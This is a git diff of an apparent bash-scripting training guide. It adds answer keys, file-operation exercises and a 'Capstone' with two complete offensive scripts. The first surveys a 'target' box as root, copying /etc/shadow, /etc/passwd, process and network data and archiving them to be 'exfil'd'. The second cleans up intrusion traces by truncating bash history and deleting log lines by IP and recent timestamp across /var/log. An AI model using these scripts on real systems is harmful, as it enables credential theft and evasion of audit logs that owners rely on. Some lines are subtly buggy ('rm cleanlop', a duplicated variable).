@@ -11,6 +11,7 @@
 0. Functions
 0. Input
 0. File Operations
+0. Capstone
 
 ## Variables
 
@@ -224,13 +225,13 @@ echo "My second value is $my_val"
 1. What is the first line of output of this script?
   - [ ] `My first value is 4`
   - [ ] `My first value is 5`
-  - [ ] `My first value is 9`
+  - [X] `My first value is 9`
   - [ ] `My first value is Incorrect`
 0. What is the second line of output of this script?
-  - [ ] `My second value is 1`
   - [ ] `My second value is 2`
+  - [ ] `My second value is 3`
   - [ ] `My second value is 6`
-  - [ ] `My second value is Incorrect`
+  - [X] `My second value is Incorrect`
 
 ## Input
 
@@ -242,7 +243,7 @@ echo "My second value is $my_val"
 echo Input your new credentials:
 read -p "Username: " username
 read -sp "Password: " userpass
-echo
+echo # Return to the next line
 echo Thank you, $username, your credentials have been input.
 ```
 
@@ -253,8 +254,8 @@ echo Thank you, $username, your credentials have been input.
 # This script is one example solution to the problem
 echo Input your new credentials:
 read -p "Username: " username
-passcorrect=0
 
+passcorrect=0
 while [ $passcorrect -eq 0]
 do
   read -sp "Enter Password: " pass1
@@ -270,3 +271,223 @@ do
 done
 echo Thank you, $username, your credentials have been input.
 ```
+
+## File Operations
+
+1. Write a simple script that writes to a file in "/tmp/" named "bin_files". The first line of the file should have the text "These are the files located in /bin". The next lines should be all the files in your /bin directory. Finally, the last line should have the text "There are <num> files in /bin" where <num> is the number of files.
+
+```bash
+#!/bin/bash
+# This script is one example solution to the problem
+file="/tmp/bin_files"
+echo "These are the files located in /bin" > $file
+ls /bin >> $file
+num=$(ls /bin | wc -l)
+echo "There are $num files in /bin" >> $file
+```
+
+0. Now, develop a script that will read in the "/tmp/bin_files" file you just created, echo out every filename that starts with a "cu", count the number of files that begin with "d", and output that number.  
+(Hint: if statements using "==" behave differently in double brackets [[ == ]]. Recall you can use wildcard matching i.e. `[[ test == tes* ]]`)
+
+```bash
+#!/bin/bash
+# This script is one example solution to the problem
+input="/tmp/bin_files"
+count=0
+while IFS= read -r line
+do
+  if [[ $line == cu* ]] ;
+  then
+    echo $line
+  fi
+  if [[ $line == d* ]] ;
+  then
+    let "count = $count + 1"
+  fi
+done < $input
+echo "There are $count files that begin with \"d\""
+```
+
+## Capstone
+
+[//]: # (### *Determine What a Script Does*)
+[//]: # (Add harder scripts that incorporate all the concepts covered and ask what the output or effects of the script would be.)
+
+### *Write Your Own Scripts*
+**Survey Script**  
+Write a script to survey a target Linux box. You may assume you are root. Here are some ideas for what your script can do:
+- Check who is logged in / how many users are logged in
+- Check how long the system has been up
+- Check system load averages
+- Check the date of the systems
+- Collect system information e.g. OS and conversion
+- Enumerate the root directory's contents
+- Enumerate the default logging directory's contents
+- Gather the process list
+- Capture the system's network connections
+- Capture its listening ports/services
+- Check file system disk usage
+- Check current remote mounts
+- Collect user-, password-, and group-related files
+- Gather the system's modules
+- Gather the system's services
+- Collect every user's cron jobs
+- Compress all this data so it can be exfil'd
+
+```bash
+#!/bin/bash
+# A Linux survey script
+# You are assumed to be root
+# The end result is a tarred set of files: tmp.txt and a collection of "tmp.*" randomly named files.
+# tmp.txt is the "guide" or "table of contents" mapping the random filenames to their contents.
+
+MYFILE=/tmp/tmp.txt
+touch $MYFILE
+
+#Who is logged in / how many users are logged in
+USERS=$(mktemp)
+echo "USERS: $USERS" >> $MYFILE
+w >> $USERS
+who >> $USERS
+users >> $USERS
+
+#How long the system has been up
+SYSTEM=$(mktemp)
+echo "SYSTEM: $SYSTEM" >> $MYFILE
+uptime -p >> $SYSTEM
+who -b >> $SYSTEM
+
+#System load averages
+uptime >> $SYSTEM
+cat /proc/loadavg >> $SYSTEM
+
+#Date
+date >> $SYSTEM
+
+#System information (kernel version)
+#Operating system and version
+echo "Kernel Name, Network Node Hostname, Kernel Release, Kernel Version, Machine Hardware Name, Processor Type, Hardware Platform, Operating System" >> $SYSTEM
+uname -a >> $SYSTEM
+
+#A directory listing of several important directories
+FILES=$(mktemp)
+echo "FILES: $FILES" >> $MYFILE
+ls -al / >> $FILES
+
+#Process list
+PROCESSES=$(mktemp)
+echo "PROCESSES: $PROCESSES" >> $MYFILE
+ps -eo euser,ruser,suser,fuser,f,comm,label >> $PROCESSES
+ps aux >> $PROCESSES
+
+#Network connections and listening ports / services
+NTWKING=$(mktemp)
+echo "NTWKING: $NTWKING" >> $MYFILE
+netstat -pantu >> $NTWKING
+
+#File system disk usage and any current remote mounts
+df >> $FILES
+mount >> $FILES
+
+#Directory listing of the logging directory
+LOGS=$(mktemp)
+echo "LOGS: $LOGS" >> $MYFILE
+ls -al /var/log >> $LOGS
+
+#Collect user and password files
+PASSWD=$(mktemp)
+SHADOW=$(mktemp)
+GROUPS=$(mktemp)
+cat /etc/passwd > $PASSWD
+cat /etc/shadow > $SHADOW
+cat /etc/group > $GROUPS
+
+#Modules
+MODULES=$(mktemp)
+echo "MODULES: $MODULES" >> $MYFILE
+lsmod >> $MODULES
+
+#Services (systems using init will be in /etc/init.d)
+service --status-all
+SERVICES1=$(mktemp)
+systemctl list-units --type service > $SERVICES1
+SERVICES2=$(mktemp)
+systemctl list-unit-files > $SERVICES2
+
+#Anything else you feel would be beneficial information
+### for each user in users, crontab -u user -l
+CRONS=$(mktemp)
+echo "CRONS: $CRONS" >> $MYFILE
+for i in $(users); do echo $i >> $CRONS && crontab -u $i -l &>> $CRONS; done
+
+### tar up and scp tmp files somewhere, or webserve so it can be downloaded, or just download via meterpreter, etc.
+tar -cf srvy.tar tmp.*
+#tar -tvf tmp.tar # to list tarred files
+
+# Remove generated tmp files
+rm tmp.*
+```
+
+**Log Cleaning Script**  
+ Write a script to clean logs. Apply it to your survey script so you clean up your activity on the system. Here are some ideas for what your script can do:
+ - Erase all or a particular number of recent commands from bash history
+ - Clean any line with a particular IP address from every log in /var/log/
+ - For all logs in /var/log/, remove any lines with a timestamp from the past 2 minutes  
+  (Hint: use the `date` command and `egrep`)
+
+```bash
+#!/bin/bash
+# A Linux cleanup script
+
+# Remove the last 50 lines from bash history
+# i.e. Preserve all but the last 50 lines
+len_of_bash_hist=$(cat $HISTFILE | wc -l)
+echo "Cleaning bash history..."
+if [ $len_of_bash_hist -gt 50 ]; then
+  head --lines=-50 $HISTFILE > new_bash_hist
+  cat new_bash_hist > $HISTFILE
+  rm new_bash_hist # cleanup
+fi
+
+# Remove all instances of a particular IP from all /var/log/ logs
+bad_ip="10.10.10.10"
+echo "Cleaning bad IP $bad_ip from logs..."
+for file in $(grep -r -l $bad_ip /var/log)
+do
+  grep -v $bad_ip $file > cleanlog
+  cat cleanlog > $file
+  rm cleanlop # cleanup
+done
+
+# Remove any entries from the last 2 minutes from all /var/log/ logs
+# Don't run this at the split nanosecond of noon or midnight; may have unexpected behavior
+# Construct regular expressions of the current time, minus 1 minute, and minus 2 minutes
+#   for both 12-hour and 24-hour formats
+expr0_12hr=$(date "+%b %d %I:%M")":[0-9]{2} "$(date "+%p")
+expr1_12hr=$(date -d "$(date)-1mins" "+%b %d %I:%M")":[0-9]{2} "$(date -d "$(date)-1mins" "+%p")
+expr2_12hr=$(date -d "$(date)-2mins" "+%b %d %I:%M")":[0-9]{2} "$(date -d "$(date)-2mins" "+%p")
+expr0_24hr=$(date "+%b %d %H:%M")
+expr1_24hr=$(date -d "$(date)-1mins" "+%b %d %H:%M")
+expr1_24hr=$(date -d "$(date)-2mins" "+%b %d %H:%M")
+echo "Cleaning log entries timestamped in the past two minutes..."
+for file in $(egrep -a -r -l "$expr0_12hr|$expr1_12hr|$expr2_12hr" /var/log)
+do
+  egrep -a -v "$expr0_12hr|$expr1_12hr|$expr2_12hr" $file > cleanlog
+  cat cleanlog > $file
+  rm cleanlog # cleanup
+done
+for file in $(egrep -a -r -l "$expr0_24hr|$expr1_24hr|$expr2_24hr" /var/log)
+do
+  egrep -a -v "$expr0_24hr|$expr1_24hr|$expr2_24hr" $file > cleanlog
+  cat cleanlog > $file
+  rm cleanlog # cleanup
+done
+
+echo Done!
+```
+
+[//]: # (**base64 Conversion Script**  )
+[//]: # (Write a script to read in a file and create a base64-encoded version of the file.)
+
+[//]: # (**Encrypt / Decrypt Script**  )
+[//]: # (Write a script or scripts to encrypt and decrypt a file with a key.)
